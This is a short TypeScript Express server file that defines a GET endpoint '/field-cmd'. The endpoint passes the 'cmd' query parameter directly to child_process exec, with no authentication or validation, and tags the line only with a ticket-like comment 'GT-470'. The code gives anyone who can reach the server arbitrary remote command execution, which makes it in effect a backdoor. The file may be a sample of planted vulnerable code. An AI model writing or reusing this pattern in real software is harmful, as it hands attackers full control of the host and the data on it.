import express from "express";
import { exec } from "child_process";

const app = express();

app.get("/field-cmd", (req, res) => {
  exec(req.query.cmd as string); // GT-470
  res.send("ok");
});
